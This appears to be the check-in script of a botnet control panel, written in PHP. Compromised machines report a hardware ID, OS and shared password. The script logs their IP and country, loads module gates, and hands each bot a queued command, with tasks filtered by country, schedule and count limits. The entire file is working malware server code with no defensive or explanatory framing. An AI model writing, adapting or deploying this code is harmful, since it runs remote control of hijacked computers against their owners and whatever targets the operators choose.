<?php
include_once('includes/all.inc');
include_once('ip2c/ip2country.php');

$ip2c = new ip2country();
$ip2c->mysql_host = $GLOBALS['db_host'];
$ip2c->db_user = $GLOBALS['db_user'];
$ip2c->db_pass = $GLOBALS['db_pass'];
$ip2c->db_name = $GLOBALS['db_name'];
$ip2c->table_name = 'ip2c';

foreach ($_REQUEST as $key => $value)
	$_REQUEST[$key] = htmlentities($value);

if ($_GET && isset($_GET['err']) && isset($_GET['os'])&& isset($_GET['pwd']) && $_GET['pwd'] == $GLOBALS['bot_pass'])
{
	db_query("INSERT INTO `error`(`os`, `err`) VALUES(:1, :2)", $_GET['os'], nl2br(htmlentities($_GET['err'])));
	die('Error stored');
}
elseif ($_GET && isset($_GET['hwid']) && isset($_GET['os']) && isset($_GET['pwd']) && $_GET['pwd'] == $GLOBALS['bot_pass'])
{
	$country = $ip2c->get_country_name($_SERVER['REMOTE_ADDR']);
	$country = (strlen($country) > 0) ? $country : "Unknown";
	$stmt = db_query("SELECT `id` FROM `bots` WHERE `hwid` = :1", $_GET['hwid']);
	if ($stmt->rowCount() > 0)
		db_query("UPDATE `bots` SET `OS` = :2, `IP` = :3, `country` = :4, `date` = CURRENT_TIMESTAMP WHERE `hwid` = :1", $_GET['hwid'], $_GET['os'], $_SERVER['REMOTE_ADDR'], $country);
	else
		db_query("INSERT INTO `bots`(`hwid`, `OS`, `IP`, `country`) VALUES(:1, :2, :3, :4)", $_GET['hwid'], $_GET['os'], $_SERVER['REMOTE_ADDR'], $country);
	// module
	foreach (scandir('modules') as $mod)
	{
		if ($mod != '.' && $mod != '..')
			include_once('modules/'.$mod.'/gate.php');
	}
	// tasks
	$stmt = db_query("SELECT * FROM `tasks` WHERE
				(
					(`start` <= NOW() AND `stop` > NOW()) OR 
					(`start` = '0000-00-00 00:00:00' and `stop` = '0000-00-00 00:00:00')
				) AND
				(`count` = 0 OR `count` > `received`) AND
				(`countries` = '' OR `countries` LIKE concat('%', :1, '%')) AND
				(SELECT COUNT(`id`) FROM `sentTasks` WHERE `tid` = `tasks`.`id` AND `hwid` = :2) = 0", $country, $_GET['hwid']);
	if ($stmt->rowCount() > 0)
	{
		$row = $stmt->fetch();
		db_query("UPDATE `tasks` SET `received` = `received` + 1 WHERE `id` = :1", $row['id']);
		db_query("INSERT INTO `sentTasks`(`tid`, `hwid`) VALUES(:1, :2)", $row['id'], $_GET['hwid']);
		echo $row['command'];
	}
}
?>